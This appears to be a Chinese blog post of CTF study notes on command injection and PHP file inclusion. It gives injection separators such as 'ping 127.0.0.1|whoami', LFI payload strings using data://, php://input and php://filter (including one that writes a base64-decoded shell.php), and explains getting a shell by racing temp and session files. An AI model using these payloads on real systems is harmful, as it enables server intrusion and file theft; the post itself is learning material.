@@ -1,0 +1,444 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icon.jpg?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icon.jpg?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="命令执行漏洞的利用                      Windows系统常用管道符：       管道符    含义|    直接执行后面的语句，例如：ping 127.0.0.1|whoami||    如果前面执行的语句执行报错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami&amp;    如果前面的语句为假，则直接执行后面的语句，前面的语句可真可假，例">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行-文件包含">
+<meta property="og:url" content="http://example.com/2021/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Biscuit19_">
+<meta property="og:description" content="命令执行漏洞的利用                      Windows系统常用管道符：       管道符    含义|    直接执行后面的语句，例如：ping 127.0.0.1|whoami||    如果前面执行的语句执行报错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami&amp;    如果前面的语句为假，则直接执行后面的语句，前面的语句可真可假，例">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://storage.tttang.com/media/attachment/2021/11/01/728ac837-fd5a-4ecc-abbb-2294784374e1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205433.png">
+<meta property="og:image" content="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205434.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205435.png">
+<meta property="article:published_time" content="2021-11-28T14:05:29.000Z">
+<meta property="article:modified_time" content="2021-11-28T14:06:11.456Z">
+<meta property="article:author" content="Biscuit19_">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://storage.tttang.com/media/attachment/2021/11/01/728ac837-fd5a-4ecc-abbb-2294784374e1.png"><title>命令执行-文件包含 | Biscuit19_</title><link ref="canonical" href="http://example.com/2021/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"100px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Biscuit19_</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">命令执行-文件包含</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-11-28</span></span></div></header><div class="post-body"><pre><code> 命令执行漏洞的利用
+</code></pre>
+
+        <h2 id="Windows系统常用管道符："   >
+          <a href="#Windows系统常用管道符：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Windows系统常用管道符：" class="headerlink" title="Windows系统常用管道符："></a>Windows系统常用管道符：</h2>
+      <p>管道符    含义<br>|    直接执行后面的语句，例如：ping 127.0.0.1|whoami<br>||    如果前面执行的语句执行报错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami<br>&amp;    如果前面的语句为假，则直接执行后面的语句，前面的语句可真可假，例如：ping 127.0.0.1&amp;whoami<br>&amp;&amp;    如果前面的语句为假，则直接报错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami</p>
+
+        <h2 id="Linux系统支持的管道符："   >
+          <a href="#Linux系统支持的管道符：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux系统支持的管道符：" class="headerlink" title="Linux系统支持的管道符："></a>Linux系统支持的管道符：</h2>
+      <p>管道符    含义<br>；    执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami<br>|    显示后面语句的执行结果，例如：ping 127.0.0.1|whoami，会把前一个命令的结果作为参数传给后一个命令。<br>||    如果前面执行的语句执行报错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami<br>&amp;    不管前后命令是否执行成功都会执行前后命令    例如：ping 127.0.0.1&amp;whoami<br>&amp;&amp;    如果前面的语句为假，则直接报错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami</p>
+
+        <h2 id="linux常用目录"   >
+          <a href="#linux常用目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#linux常用目录" class="headerlink" title="linux常用目录:"></a>linux常用目录:</h2>
+      <p>/ 表示系统根目录,任何时候都是</p>
+<p>/etc/passwd 系统密码</p>
+<p>/var/www/html/index.php  一般网站</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>换行符号</th>
+<th>操作系统</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\n 10</td>
+<td>Unix or Linux</td>
+</tr>
+<tr>
+<td>\r\n 13 10(ascii)</td>
+<td>Windows</td>
+</tr>
+</tbody></table></div>
+
+        <h2 id="PHP命令执行函数"   >
+          <a href="#PHP命令执行函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP命令执行函数" class="headerlink" title="PHP命令执行函数"></a>PHP命令执行函数</h2>
+      
+        <h3 id="1-system函数-最优先"   >
+          <a href="#1-system函数-最优先" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-system函数-最优先" class="headerlink" title="1.system函数(最优先)"></a><strong>1.system函数(最优先)</strong></h3>
+      <p>用于执行外部程序并显示输出</p>
+<p>string system ( string $command [,int $return_var ])<br><?php system('whoami');?></p>
+<p>执行后输出root</p>
+
+        <h3 id="exec函数"   >
+          <a href="#exec函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h3>
+      <p>用于执行一个外部程序</p>
+<p>string exec（string $command[,array &amp;$output[,ubt &amp;$return_var]]）</p>
+<?php echo exec('whoami');?>
+
+<p>执行时加上echo 才会输出whoami的结果root</p>
+
+        <h3 id="shell-exec函数"   >
+          <a href="#shell-exec函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3>
+      <p>通过shell环境执行命令 且将完整的输出以字符串方式返回</p>
+<p>string shell_exec(string $cmd)</p>
+<?php echo shell_exec('whoami');?>
+
+<p><strong>执行时加上echo</strong> 才会输出whoami的结果root</p>
+
+        <h3 id="passthu函数-也优先"   >
+          <a href="#passthu函数-也优先" class="heading-link"><i class="fas fa-link"></i></a><a href="#passthu函数-也优先" class="headerlink" title="passthu函数(也优先)"></a>passthu函数(也优先)</h3>
+      <p>用于执行外部程序并显示原始输出</p>
+<p>void passthru(string $command[,int &amp;$return_var])</p>
+<?php passthru('whoami');?>
+
+<p>执行后默认输出root</p>
+
+        <h2 id="目录-文件操作"   >
+          <a href="#目录-文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录-文件操作" class="headerlink" title="目录/文件操作"></a>目录/文件操作</h2>
+      
+        <h3 id="命令行操作"   >
+          <a href="#命令行操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h3>
+      
+        <h4 id="目录操作"   >
+          <a href="#目录操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4>
+      <p>1.目录符号</p>
+<p>. 或者./代表当前目录，</p>
+<p>..  或者 ../代表上级目录 ../../上上级 以此类推</p>
+<p>~ 代表用户的home目录</p>
+<p>/ 代表系统根目录</p>
+<p>2.ls      </p>
+<p>ls         查看当前目录下的所有目录和文件</p>
+<p>ls .. 查看上级目录所有文件</p>
+<p>ls -a       查看当前目录下的所有目录和文件（包括隐藏的文件）</p>
+<p>3.目录切换 cd</p>
+<p>cd 目录 切换到目录</p>
+<p>cd /     切换到根目录<br>cd /usr     切换到根目录下的usr目录<br>cd ..    (windows: ../)</p>
+<p>4.pwd 查看当前文件目录绝对路径</p>
+<p>5.cp 1.txt 2.txt 复制文件到当前目录</p>
+<p>cp -r A  B           复制目录到当前目录 后者为新目录的名字</p>
+
+        <h4 id="文件操作"   >
+          <a href="#文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4>
+      <p>文件的打开查看命令：</p>
+<p>cat 文件名 : 输出这个文件的内容</p>
+<p>cat /var/www/fl4gisisish3r3.php</p>
+<p>查找某文件的绝对路径:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot; </span><br><span class="line">从/(根目录)查找文件名里有flag的文件(模糊查询)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h3 id="php操作"   >
+          <a href="#php操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#php操作" class="headerlink" title="php操作"></a>php操作</h3>
+      
+        <h4 id="目录操作-1"   >
+          <a href="#目录操作-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录操作-1" class="headerlink" title="目录操作"></a>目录操作</h4>
+      <p>目录切换:</p>
+<p>../表示源文件所在目录的上一级目录，../../表示源文件所在目录的上上级目录</p>
+<p>查看目录:</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span> ; <span class="comment">// 取得当前文件的绝对地址，结果：D:\www\test.php</span></span><br><span class="line"><span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>); <span class="comment">// 取得当前文件所在的绝对目录，结果：D:\www\</span></span><br><span class="line"><span class="keyword">echo</span> dirname(dirname(<span class="keyword">__FILE__</span>)); <span class="comment">//取得当前文件的上一层目录名，结果：D:\</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="文件操作-1"   >
+          <a href="#文件操作-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h4>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(<span class="string">&quot;文件名&quot;</span>);<span class="comment">//返回一个字符串</span></span><br><span class="line"><span class="comment">//文件名示例: </span></span><br><span class="line">同目录:flag.txt</span><br><span class="line">上级目录:../flag.txt</span><br><span class="line">真实路径:</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h2 id="‘-‘和’-‘"   >
+          <a href="#‘-‘和’-‘" class="heading-link"><i class="fas fa-link"></i></a><a href="#‘-‘和’-‘" class="headerlink" title="‘/‘和’\‘"></a>‘/‘和’\‘</h2>
+      <p>/是斜杠, \是反斜杠</p>
+<p>Windows采用\，如 C:\Windows(C盘Windows目录下)</p>
+<p>Linux采用/，如/user/lib/file.txt（主分区的ROOT目录下）</p>
+<p>网址也采用/, 如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer" >https://adworld.xctf.org.cn/task/answer</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><strong>同时,’\‘也用作转义符</strong></p>
+<p>所以我们会看到这样的路径:</p>
+<p>C:\\folder1\\folder2\\folder3\\file.txt  (windos下的)</p>
+<p>看到这样的网址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:\/\/10.21.145.59\/FileImage\/test5\/d2\/1f722236d946fd98536ba805de31ed1ac2f4f8.jpg</span><br><span class="line">解析后：</span><br><span class="line">http://10.21.145.59/FileImage/test5/d2/1f722236d946fd98536ba805de31ed1ac2f4f8.jpg</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h2 id="文件包含"   >
+          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h2>
+      
+        <h3 id="一、包含函数"   >
+          <a href="#一、包含函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、包含函数" class="headerlink" title="一、包含函数"></a>一、包含函数</h3>
+      <p>当利用这以下四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p>
+
+        <h4 id="1、include-函数"   >
+          <a href="#1、include-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、include-函数" class="headerlink" title="1、include()函数"></a>1、include()函数</h4>
+      <p><strong>include()函数包含出错的话只会提出警告，但并不会影响后续语句的执行。</strong></p>
+
+        <h4 id="2-require-函数"   >
+          <a href="#2-require-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-require-函数" class="headerlink" title="2.require()函数"></a>2.require()函数</h4>
+      <p><strong>require() 函数包含出错的话，则会直接退出，后续语句不在执行</strong></p>
+
+        <h4 id="3-include-once-和require-once-函数"   >
+          <a href="#3-include-once-和require-once-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-include-once-和require-once-函数" class="headerlink" title="3.include_once()和require_once()函数"></a>3.include_once()和require_once()函数</h4>
+      <p><strong>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</strong></p>
+
+        <h3 id="二-漏洞类型"   >
+          <a href="#二-漏洞类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#二-漏洞类型" class="headerlink" title="二. 漏洞类型"></a>二. 漏洞类型</h3>
+      
+        <h4 id="allow-url-fopen和allow-url-include对文件包含的影响"   >
+          <a href="#allow-url-fopen和allow-url-include对文件包含的影响" class="heading-link"><i class="fas fa-link"></i></a><a href="#allow-url-fopen和allow-url-include对文件包含的影响" class="headerlink" title="allow_url_fopen和allow_url_include对文件包含的影响"></a><strong>allow_url_fopen和allow_url_include对文件包含的影响</strong></h4>
+      <p>allow_url_fopen  #允许url打开远程文件，如果url传入的参数是本地文件的不受此限制</p>
+<p>当allow_url_fopen打开，allow_url_include关闭时</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/fi/?page=file1.php                             #可以使用</span><br><span class="line">/fi/?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=D:\phpstudy_pro\WWW\one.txt  #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=file:<span class="comment">//D:\phpstudy_pro\WWW\one.txt     #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=http:<span class="comment">//127.0.0.1/one.txt               #不可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=data:text/plain;base64,cXdlcmFhYQ==    #不可以使用</span><br><span class="line">/fi/?page=php:<span class="comment">//input                            #不可以使用</span></span><br></pre></td></tr></table></div></figure>
+
+<p>当关闭了allow_url_open和allow_url_include时</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/fi/?page=file1.php                             #可以使用</span><br><span class="line">/fi/?page=file:<span class="comment">//D:\phpstudy_pro\WWW\one.txt     #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=D:\phpstudy_pro\WWW\one.txt  #可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=http:<span class="comment">//127.0.0.1/one.txt               #不可以使用</span></span><br><span class="line"><span class="regexp">/fi/</span>?page=data:text/plain;base64,cXdlcmFhYQ==    #不可以使用</span><br><span class="line">/fi/?page=php:<span class="comment">//input                            #不可以使用</span></span><br></pre></td></tr></table></div></figure>
+
+<p>当allow_url_open关闭时，而allow_url_include开启的时候，只有php://input可以使用。php://input可以读取没有处理过的POST数据。php://input这个是不受allow_url_fopen影响。</p>
+
+        <h4 id="1、LFI：本地文件包含漏洞"   >
+          <a href="#1、LFI：本地文件包含漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、LFI：本地文件包含漏洞" class="headerlink" title="1、LFI：本地文件包含漏洞"></a>1、LFI：本地文件包含漏洞</h4>
+      <p>LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。</p>
+<p>同时借助此漏洞也可以查看服务器上的一些重要文件。</p>
+
+        <h4 id="2、RFI：远程文件包含漏洞"   >
+          <a href="#2、RFI：远程文件包含漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、RFI：远程文件包含漏洞" class="headerlink" title="2、RFI：远程文件包含漏洞"></a>2、RFI：远程文件包含漏洞</h4>
+      <p>RFI(Remote File Inclusion) 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。</p>
+<p>需要都打开allow_url_fopen = On  allow_url_include = On</p>
+
+        <h3 id="三-伪协议"   >
+          <a href="#三-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#三-伪协议" class="headerlink" title="三.伪协议"></a>三.伪协议</h3>
+      <p>伪协议就是 伪协议的这段话在被包含时, 会执行协议内容</p>
+<p>伪协议就是一个作用，就是你把它需要的东西输入进去，它就会实现响应的作用</p>
+<p>data://text/plain,<?php print_r(scandir(/var/www));?></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen 默认为 On（本地）</span><br><span class="line">allow_url_include 默认为 Off（远程）</span><br></pre></td></tr></table></div></figure>
+
+<p>协议</p>
+
+        <h4 id="http"   >
+          <a href="#http" class="heading-link"><i class="fas fa-link"></i></a><a href="#http" class="headerlink" title="http://"></a>http://</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="ftp"   >
+          <a href="#ftp" class="heading-link"><i class="fas fa-link"></i></a><a href="#ftp" class="headerlink" title="ftp://"></a>ftp://</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="php-input"   >
+          <a href="#php-input" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="data"   >
+          <a href="#data" class="heading-link"><i class="fas fa-link"></i></a><a href="#data" class="headerlink" title="data://"></a>data://</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=On</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="allow-url-include不需要ON"   >
+          <a href="#allow-url-include不需要ON" class="heading-link"><i class="fas fa-link"></i></a><a href="#allow-url-include不需要ON" class="headerlink" title="allow_url_include不需要ON"></a>allow_url_include不需要ON</h4>
+      
+        <h4 id="php-filter"   >
+          <a href="#php-filter" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=Off/Onpld：?file=以base64读取：php://filter/read=convert.base64-encode/resource=index.php写入的时候，也需要include为open以base64写入：=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php（    &lt;?php phpinfo();?&gt;    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="file"   >
+          <a href="#file" class="heading-link"><i class="fas fa-link"></i></a><a href="#file" class="headerlink" title="file://"></a>file://</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=Off/On</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="phar"   >
+          <a href="#phar" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=Off/Onallow_url_include=Off/On</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h4 id="常用payload"   >
+          <a href="#常用payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.?file=data:text/plain,&lt;?php phpinfo()?&gt;2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=3.?file=php://input [POST DATA:]&lt;?php phpinfo()?&gt;4.?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="临时文件包含"   >
+          <a href="#临时文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x01" >https://tttang.com/archive/1312/#toc_0x01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="原理"   >
+          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h3>
+      <p>我们对任意一个PHP文件发送一个上传的数据包时，<strong>不管这个PHP服务后端是否有处理<code>$_FILES</code>的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中</strong>，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉。</p>
+<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/728ac837-fd5a-4ecc-abbb-2294784374e1.png" alt="image-20211012074128955.png"></p>
+<p>在从“PHP writes data to temp file”到“php removes temp files(if any)”这两个操作之间的这段时间，我们可以包含这个临时文件，最后完成getshell操作。但这里面暗藏了一个大坑就是，<strong>临时文件的文件名我们是不知道的</strong>。</p>
+
+        <h3 id="1-session-upload-progress与Session文件包含"   >
+          <a href="#1-session-upload-progress与Session文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-session-upload-progress与Session文件包含" class="headerlink" title="1.session.upload_progress与Session文件包含"></a>1.session.upload_progress与Session文件包含</h3>
+      <p>详见LFI_to_RCE复现</p>
+<p>​    上述的两个方法，其实都没有解决本篇文章遇到的问题，毕竟Docker环境即不存在phpinfo也不存在Windows特性。</p>
+<p>​    第三个方法也已经广为流传，PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件：</p>
+<ul>
+<li><strong>目标环境开启了<code>session.upload_progress.enable</code>选项</strong></li>
+<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li>
+<li>请求的Cookie中包含Session ID（启用了session）</li>
+</ul>
+<p>这个方法的原理是，PHP在开启了<code>session.upload_progress.enable</code>后（在包括Docker的大部分环境下默认是开启的），将会把用户<strong>上传文件的信息</strong>保存在Session中，<strong>而PHP的Session默认是保存在文件里的</strong>。</p>
+<p>所以当攻击者发送满足上述条件的数据包时，就等于能够控制<strong>Session文件内容。</strong></p>
+<p>但是PHP中还有另外一个配置项<code>session.upload_progress.cleanup</code>，默认开启。在这个选项开启时，PHP会在<strong>上传请求被读取完成后自动清理掉这个Session</strong>，</p>
+<p>所以，默认情况下，我们需要在Session文件被清理前利用它，这也会用到条件竞争（Race Condition），也就是需要多线程来并发执行，力求在/tmp/sess_PHPSESSID被清除之前，就能执行文件包含，执行我们的木马php命令。</p>
+
+        <h3 id="2-Segfault遗留下TEMP文件"   >
+          <a href="#2-Segfault遗留下TEMP文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Segfault遗留下TEMP文件" class="headerlink" title="2.[Segfault遗留下TEMP文件]"></a>2.[Segfault遗留下TEMP文件]</h3>
+      <p><strong>！这个Bug在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/791f07e4f06a943bd7892bdc539a7313fb3d6d1e" >7.1.20</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>以后被修复，也没有留下更新日志，我们可以使用7.1.19版本的PHP进行尝试。</strong></p>
+<p>那么，如果关闭了<code>session.upload_progress.enable</code>，是否还有其他利用方法呢？</p>
+<p>我们的目的是在服务器上留下一个内容可控的文件，最简单的方法就是利用上传包的临时文件。但这个临时文件之所以不能直接利用，原因有两点：</p>
+<ul>
+<li>临时文件名是随机的</li>
+<li>临时文件在请求结束后会被删除</li>
+</ul>
+<p>如果说第一点我们可以通过爆破来解决，那么第二点是一定无法同时解决的——我们不可能在请求结束前爆破出临时文件名。</p>
+<p>经过上面的分析，我们很容易想到一种解决方案：<strong>如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了</strong>。</p>
+<p>PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。</p>
